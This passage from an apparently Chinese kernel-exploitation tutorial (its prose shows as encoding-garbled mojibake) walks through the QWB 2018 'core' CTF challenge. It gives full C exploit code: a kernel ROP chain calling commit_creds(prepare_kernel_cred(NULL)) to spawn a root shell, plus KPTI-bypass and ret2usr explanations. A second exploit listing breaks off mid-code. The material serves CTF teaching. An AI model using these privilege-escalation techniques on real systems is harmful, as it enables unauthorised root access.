class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreRead</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setOffValue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> off)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreCopyFunc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> nbytes)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-keyword">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">size_t</span> offset = commit_creds - <span class="hljs-number">0xffffffff8109c8e0</span>;<br><br>    <span class="hljs-comment">// get the canary</span><br>    <span class="hljs-keyword">size_t</span> canary;<br>    setOffValue(fd, <span class="hljs-number">64</span>);<br>    coreRead(fd, buf);<br>    canary = ((<span class="hljs-keyword">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">//construct the ropchain</span><br>    <span class="hljs-keyword">size_t</span> rop_chain[<span class="hljs-number">0x100</span>], i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(; i &lt; <span class="hljs-number">10</span>;i++)<br>        rop_chain[i] = canary;<br>    rop_chain[i++] = POP_RDI_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = prepare_kernel_cred;<br>    rop_chain[i++] = POP_RDX_RET + offset;<br>    rop_chain[i++] = POP_RCX_RET + offset; <span class="hljs-comment">// just to clear the useless stack data</span><br>    rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + offset;<br>    rop_chain[i++] = commit_creds;<br>    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;<br>    rop_chain[i++] = <span class="hljs-number">0</span>;<br>    rop_chain[i++] = IRETQ + offset;<br>    rop_chain[i++] = (<span class="hljs-keyword">size_t</span>)getRootShell;<br>    rop_chain[i++] = user_cs;<br>    rop_chain[i++] = user_rflags;<br>    rop_chain[i++] = user_sp;<br>    rop_chain[i++] = user_ss;<br><br>    write(fd, rop_chain, <span class="hljs-number">0x800</span>);<br>    coreCopyFunc(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ç¼–è¯‘æŒ‡ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> gcc ./exploit.c -o exploit -static -masm=intel</span><br></code></pre></div></td></tr></table></figure><p>æœ¬åœ°è°ƒè¯•çš„è¯é‡æ–°æ‰“åŒ…å³å¯</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL"><span class="hljs-meta">$</span><span class="bash"> find . | cpio -o -H newc &gt; ../core.cpio</span><br></code></pre></div></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾—root shell</p><p><a href="https://i.loli.net/2021/03/09/4InLOlstS3UZiPh.png"><img src="https://s2.loli.net/2023/02/06/YOe2KzXNygfErZs.png" alt="image.png" style="zoom:50%;" /></a></p><h2 id="è¿”å›ç”¨æˆ·æ€-with-KPTI-bypass"><a href="#è¿”å›ç”¨æˆ·æ€-with-KPTI-bypass" class="headerlink" title="è¿”å›ç”¨æˆ·æ€ with KPTI bypass"></a>è¿”å›ç”¨æˆ·æ€ with KPTI bypass</h2><p>å¯¹äºå¼€å¯äº† KPTIï¼ˆå†…æ ¸é¡µè¡¨éš”ç¦»ï¼‰ï¼Œæˆ‘ä»¬<strong>ä¸èƒ½åƒä¹‹å‰é‚£æ ·ç›´æ¥ swapgs ; iret è¿”å›ç”¨æˆ·æ€</strong>ï¼Œè€Œæ˜¯åœ¨è¿”å›ç”¨æˆ·æ€ä¹‹å‰è¿˜<strong>éœ€è¦å°†ç”¨æˆ·è¿›ç¨‹çš„é¡µè¡¨ç»™åˆ‡æ¢å›æ¥</strong></p><p>ä¼—æ‰€å‘¨çŸ¥ Linux é‡‡ç”¨<strong>å››çº§é¡µè¡¨</strong>ç»“æ„ï¼ˆPGD-&gt;PUD-&gt;PMD-&gt;PTEï¼‰ï¼Œè€Œ CR3 æ§åˆ¶å¯„å­˜å™¨ç”¨ä»¥å­˜å‚¨å½“å‰çš„ PGD çš„åœ°å€ï¼Œå› æ­¤åœ¨å¼€å¯ KPTI çš„æƒ…å†µä¸‹ç”¨æˆ·æ€ä¸å†…æ ¸æ€ä¹‹é—´çš„åˆ‡æ¢ä¾¿æ¶‰åŠåˆ° CR3 çš„åˆ‡æ¢ï¼Œä¸ºäº†æé«˜åˆ‡æ¢çš„é€Ÿåº¦ï¼Œå†…æ ¸å°†å†…æ ¸ç©ºé—´çš„ PGD ä¸ç”¨æˆ·ç©ºé—´çš„ PGD ä¸¤å¼ é¡µå…¨å±€ç›®å½•è¡¨æ”¾åœ¨ä¸€æ®µè¿ç»­çš„å†…å­˜ä¸­ï¼ˆä¸¤å¼ è¡¨ï¼Œä¸€å¼ ä¸€é¡µ4kï¼Œæ€»è®¡8kï¼Œå†…æ ¸ç©ºé—´çš„åœ¨ä½åœ°å€ï¼Œç”¨æˆ·ç©ºé—´çš„åœ¨é«˜åœ°å€ï¼‰ï¼Œè¿™æ ·<strong>åªéœ€è¦å°† CR3 çš„ç¬¬ 13 ä½å–åä¾¿èƒ½å®Œæˆé¡µè¡¨åˆ‡æ¢çš„æ“ä½œ</strong></p><p><a href="https://i.loli.net/2021/09/10/Rm8Ti9MpVUZ7fPK.png"><img src="https://s2.loli.net/2023/02/06/9CYOpuld2cLvXbM.png" alt="image.png"></a></p><p>éœ€è¦è¿›è¡Œè¯´æ˜çš„æ˜¯ï¼Œ<strong>åœ¨è¿™ä¸¤å¼ é¡µè¡¨ä¸Šéƒ½æœ‰ç€å¯¹ç”¨æˆ·å†…å­˜ç©ºé—´çš„å®Œæ•´æ˜ å°„ï¼Œä½†åœ¨ç”¨æˆ·é¡µè¡¨ä¸­åªæ˜ å°„äº†å°‘é‡çš„å†…æ ¸ä»£ç ï¼ˆä¾‹å¦‚ç³»ç»Ÿè°ƒç”¨å…¥å£ç‚¹ã€ä¸­æ–­å¤„ç†ç­‰ï¼‰ï¼Œè€Œåªæœ‰åœ¨å†…æ ¸é¡µè¡¨ä¸­æ‰æœ‰ç€å¯¹å†…æ ¸å†…å­˜ç©ºé—´çš„å®Œæ•´æ˜ å°„</strong>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¦ä¾§æ˜¯æœªå¼€å¯ KPTI åçš„é¡µè¡¨å¸ƒå±€ï¼Œå³ä¾§æ˜¯å¼€å¯äº† KPTI åçš„é¡µè¡¨å¸ƒå±€</p><p><strong>KPTI åŒæ—¶è¿˜ä»¤å†…æ ¸é¡µè¡¨ä¸­ç”¨æˆ·åœ°å€ç©ºé—´éƒ¨åˆ†å¯¹åº”çš„é¡µé¡¶çº§è¡¨é¡¹ä¸å†æ‹¥æœ‰æ‰§è¡Œæƒé™ï¼ˆNXï¼‰ï¼Œè¿™ä½¿å¾— ret2usr å½»åº•æˆä¸ºè¿‡å»å¼</strong></p><blockquote><p>åœ¨ 64 ä½ä¸‹ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´éƒ½å  128 TBï¼Œæ‰€ä»¥ä»–ä»¬å ç”¨çš„é¡µå…¨å±€è¡¨é¡¹ï¼ˆPGDï¼‰çš„å¤§å°åº”å½“æ˜¯ç›¸åŒçš„ï¼Œå›¾ä¸Šæ²¡æœ‰ä½“ç°å‡ºæ¥ï¼Œå› æ­¤è¿™é‡Œç”±ç¬”è€…ä»£ä¸ºè¡¥å……è¯´æ˜ï¼ˆç¬‘ï¼‰</p></blockquote><p><a href="https://s2.loli.net/2022/03/11/q74X6lbTnrNGhC1.png"><img src="https://s2.loli.net/2022/03/11/q74X6lbTnrNGhC1.png" alt="image.png"></a></p><blockquote><p>ç¬”è€…ä»¥å‰å­¦ä¹  KPTI æ—¶çœ‹äº†ä¸€ç¯‡æŸä¹ä¸Šçš„æ–‡ç« è¯´æ˜¯ç”¨æˆ·ç©ºé—´ä¸€å¼ é¡µè¡¨ï¼Œå†…æ ¸ç©ºé—´ä¸€å¼ é¡µè¡¨ï¼Œ<strong>å®ç°å®Œæ•´çš„éš”ç¦»</strong>ï¼Œç¬”è€…ä¸€åº¦ä¿¡ä»¥ä¸ºçœŸï¼Œåé¢æƒ³æƒ³ä¸å¯¹åŠ²ï¼Œ<strong>å¦‚æœç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çœŸæ˜¯å®Œå…¨éš”ç¦»çš„è¯ä»–ä»¬ä¹‹é—´ç”šè‡³æ— æ³•è¿›è¡Œæ•°æ®äº¤æ¢ï¼Œå› æ­¤å¿…å®šåœ¨æŸä¸ªèŠ‚ç‚¹ä¸ŠåŒæ—¶å­˜åœ¨ç€å®Œæ•´çš„å¯¹ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çš„æ˜ å°„</strong>ï¼Œè¿™ä¸ªèŠ‚ç‚¹å°±æ˜¯å½“ CPU è¿è¡Œåœ¨å†…æ ¸æ€æ—¶</p></blockquote><p>é™¤äº†åœ¨ç³»ç»Ÿè°ƒç”¨å…¥å£ä¸­å°†ç”¨æˆ·æ€é¡µè¡¨åˆ‡æ¢åˆ°å†…æ ¸æ€é¡µè¡¨çš„ä»£ç å¤–ï¼Œå†…æ ¸ä¹Ÿç›¸åº”åœ°åœ¨ <code>arch/x86/entry/entry_64.S</code> ä¸­æä¾›äº†ä¸€ä¸ªç”¨äºå®Œæˆå†…æ ¸æ€é¡µè¡¨åˆ‡æ¢å›åˆ°ç”¨æˆ·æ€é¡µè¡¨çš„å‡½æ•° <code>swapgs_restore_regs_and_return_to_usermode</code>ï¼Œåœ°å€å¯ä»¥åœ¨ <code>/proc/kallsyms</code> ä¸­è·å¾—</p><p>æºç çš„ AT&amp;T æ±‡ç¼–æ¯”è¾ƒåäººç±»ï¼Œæ¨èç›´æ¥æŸ¥çœ‹ IDA çš„åæ±‡ç¼–ç»“æœï¼ˆäº²åˆ‡çš„ Intel é£æ ¼ï¼‰ï¼š</p><p><a href="https://i.loli.net/2021/09/10/FpymLdwJMnRU4hi.png"><img src="https://s2.loli.net/2023/02/06/hEyfdNLU36Mq7Jr.png" alt="image.png"></a></p><p>åœ¨å®é™…æ“ä½œæ—¶å‰é¢çš„ä¸€äº›æ ˆæ“ä½œéƒ½å¯ä»¥è·³è¿‡ï¼Œç›´æ¥ä» <code>mov rdi, rsp</code> å¼€å§‹ï¼Œè¿™ä¸ªå‡½æ•°å¤§æ¦‚å¯ä»¥æ€»ç»“ä¸ºå¦‚ä¸‹æ“ä½œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ASSEMBLY">mov  rdi, cr3<br>or rdi, 0x1000<br>mov  cr3, rdi<br>pop rax<br>pop rdi<br>swapgs<br>iretq<br></code></pre></div></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦å¸ƒç½®å‡ºå¦‚ä¸‹æ ˆå¸ƒå±€å³å¯ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs AWK">â†“   swapgs_restore_regs_and_return_to_usermode<br>    <span class="hljs-number">0</span> <span class="hljs-regexp">//</span> padding<br>    <span class="hljs-number">0</span> <span class="hljs-regexp">//</span> padding<br>    user_shell_addr<br>    user_cs<br>    user_rflags<br>    user_sp<br>    user_ss<br></code></pre></div></td></tr></table></figure><p>æˆ‘ä»¬åŒæ—¶ä¹Ÿå¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªæå¥½çš„ç”¨æ¥è¿›è¡Œè°ƒæ ˆçš„å‡½æ•°</p><blockquote><p>KPTI bypass è¿™é‡Œå°±ä¸æ”¾ä¾‹é¢˜äº†ï¼Œå› ä¸ºå’Œå‰é¢çš„è¿”å›ç”¨æˆ·æ€è€Œè¨€ä»…æœ‰ gadget ä»¥åŠæ ˆå¸ƒå±€ä¸Šçš„å¾®å°å·®åˆ«</p></blockquote><h1 id="Kernel-ROP-ret2usr"><a href="#Kernel-ROP-ret2usr" class="headerlink" title="Kernel ROP - ret2usr"></a>Kernel ROP - ret2usr</h1><p><strong>åœ¨ã€æœªã€‘å¼€å¯SMAP/SMEPä¿æŠ¤çš„æƒ…å†µä¸‹</strong>ï¼Œç”¨æˆ·ç©ºé—´æ— æ³•è®¿é—®å†…æ ¸ç©ºé—´çš„æ•°æ®ï¼Œä½†æ˜¯å†…æ ¸ç©ºé—´å¯ä»¥è®¿é—®/æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„æ•°æ®ï¼Œå› æ­¤ ret2usr è¿™ç§æ”»å‡»æ‰‹æ³•åº”è¿è€Œç”Ÿâ€”â€”é€šè¿‡ kernel ROP ä»¥å†…æ ¸çš„ ring 0 æƒé™æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç ä»¥å®Œæˆææƒ</p><p>é€šå¸¸ CTF ä¸­çš„ ret2usr è¿˜æ˜¯ä»¥æ‰§è¡Œ<code>commit_creds(prepare_kernel_cred(NULL))</code>è¿›è¡Œææƒä¸ºä¸»è¦çš„æ”»å‡»æ‰‹æ³•ï¼Œä¸è¿‡ç›¸æ¯”èµ·æ„é€ å†—é•¿çš„ROP chainï¼Œret2usr åªéœ€æˆ‘ä»¬è¦æå‰åœ¨ç”¨æˆ·æ€ç¨‹åºæ„é€ å¥½å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆã€è·å–ç›¸åº”å‡½æ•°åœ°å€åç›´æ¥ ret å›åˆ°ç”¨æˆ·ç©ºé—´æ‰§è¡Œå³å¯</p><p>âœ³ å¯¹äºå¼€å¯äº†<code>SMAP/SMEPä¿æŠ¤</code>çš„ kernel è€Œè¨€ï¼Œ<strong>å†…æ ¸ç©ºé—´å°è¯•ç›´æ¥è®¿é—®ç”¨æˆ·ç©ºé—´ä¼šå¼•èµ· kernel panic</strong></p><p>é€šå¸¸æƒ…å†µä¸‹çš„æŠ¥é”™ä¿¡æ¯å¤§æ¦‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL">[    7.168919] unable to execute userspace code (SMEP?) (uid: 1000)<br>[    7.170547] BUG: unable to handle kernel paging request at 0000000000401d8a<br>[    7.171399] IP: 0x401d8a<br>[    7.171598] PGD 800000000fb5e067 P4D 800000000fb5e067 PUD fb5f067 PMD fb59065<br>[    7.172087] Oops: 0011 [#1] SMP PTI<br>// è°ƒç”¨æ ˆå›æº¯<br>[    7.186319] Kernel panic - not syncing: Fatal exception<br>[    7.187391] Kernel Offset: 0x32800000 from 0xffffffff81000000 (relocation ra)<br>[    7.188504] Rebooting in 1 seconds.. <br></code></pre></div></td></tr></table></figure><h2 id="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core-1"><a href="#ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core-1" class="headerlink" title="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018 - core"></a>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018 - core</h2><blockquote><p>å¥½åƒä¹Ÿæ‰¾ä¸åˆ°åˆ«çš„çº¯ ret2usr çš„é¢˜äº†ï¼Œkernel pwn çš„é¢˜å¤ªå°‘äº†â€¦<del>ä½†æ˜¯ä½ åˆâ‘§èƒ½â‘§å­¦</del></p></blockquote><p>å…·ä½“çš„è¿™é‡Œå°±ä¸å†é‡å¤åˆ†æäº†ï¼Œç”±äºå…¶æœªå¼€å¯ smap/smep ä¿æŠ¤ï¼Œæ•…å¯ä»¥è€ƒè™‘åœ¨<strong>ç”¨æˆ·åœ°å€ç©ºé—´ä¸­æ„é€ å¥½å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆåç›´æ¥ ret2usr ä»¥ææƒ</strong>ï¼Œæˆ‘ä»¬åªéœ€è¦å°†ä»£ç ç¨åŠ ä¿®æ”¹å³å¯</p><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>  IRETQ 0xffffffff813eb448</span><br><br><span class="hljs-keyword">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-keyword">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-keyword">int</span> (*commit_creds_ptr)(<span class="hljs-keyword">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreRead</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">char</span> * buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setOffValue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> off)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, off);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">coreCopyFunc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">size_t</span> nbytes)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, nbytes);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/core&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd &lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-keyword">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span 